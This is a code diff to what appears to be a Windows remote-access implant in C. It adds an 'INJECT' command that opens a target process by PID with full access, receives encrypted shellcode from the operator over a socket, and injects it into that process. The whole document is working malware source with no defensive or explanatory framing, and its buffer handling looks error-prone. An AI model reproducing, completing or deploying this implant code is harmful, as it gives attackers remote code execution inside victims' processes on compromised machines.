@@ -6,6 +6,7 @@
 #include "common.h"
 #include "implant.h"
 #include "encryption/crypt.h"
+#include "injector/injector.h"
 
 int init_socket(OUT SOCKET *s)
 {
@@ -225,6 +226,94 @@ BOOL impl_PUT(IN SOCKET *s, IN const char *params)
     fwrite(res, sizeof(char), nwrite, fp);
 
     fclose(fp);
+
+    return TRUE;
+}
+
+BOOL impl_INJECT(IN SOCKET *s, IN const char *params)
+{
+    char            res[BUF_SZ];
+    char            status[BUF_SZ];
+    char            pid[8];
+    char            *pos;
+    HANDLE          proc_handle = NULL;
+    unsigned char   *shellcode = NULL;
+    unsigned long   ret = 0, shellcode_len = 0, shellcode_buf_len = 0x4000, nwrite;
+
+    while (*params == ' ')
+        params++;
+
+    if (*params == 0)
+        return TRUE;
+
+    RtlZeroMemory(res, sizeof(res));
+    RtlZeroMemory(status, sizeof(status));
+    RtlZeroMemory(pid, sizeof(pid));
+
+    strncpy(pid, params, sizeof(pid));
+    ret = strtoul(pid, &pos, 10);
+
+    proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)ret);
+    shellcode = (unsigned char *)malloc(shellcode_buf_len);
+
+    if (!proc_handle || !shellcode) {
+        if (shellcode) {
+            free(shellcode);
+            shellcode = NULL;
+        }
+        
+        if (proc_handle) {
+            CloseHandle(proc_handle);
+            proc_handle = NULL;
+        }
+
+        strcpy(status, STATUS_ERR);
+        sendbuf(*s, encrypt(status));
+        return TRUE;
+    }
+
+    strcpy(status, STATUS_SUCCESS);
+    sendbuf(*s, encrypt(status));
+
+    recvbuf(*s, res);
+    decrypt(res);
+
+    while (strstr(res, STATUS_END) == NULL) {
+        if (shellcode_len >= (shellcode_buf_len - sizeof(res))) {
+            shellcode = realloc(shellcode, shellcode_buf_len + 0x1000);
+            shellcode_buf_len += 0x1000;
+        }
+        memcpy(shellcode + shellcode_len, res, sizeof(res));
+        shellcode_len += sizeof(res);
+        RtlZeroMemory(res, sizeof(res));
+        recvbuf(*s, res);
+        decrypt(res);
+    }
+    RtlZeroMemory(res, sizeof(res));
+
+    recv(*s, (unsigned char *)&nwrite, 8, 0);
+    nwrite = ntohl(nwrite);
+
+    recvbuf(*s, res);
+    decrypt(res);
+    if (shellcode_len >= (shellcode_buf_len - sizeof(res))) {
+        shellcode = realloc(shellcode, shellcode_buf_len + 0x1000);
+        shellcode_buf_len += 0x1000;
+    }
+    memcpy(shellcode + shellcode_len, res, nwrite);
+    shellcode_len += nwrite;
+
+    inject(proc_handle, shellcode, shellcode_len);
+
+    if (shellcode) {
+        free(shellcode);
+        shellcode = NULL;
+    }
+
+    if (proc_handle) {
+        CloseHandle(proc_handle);
+        proc_handle = NULL;
+    }
 
     return TRUE;
 }
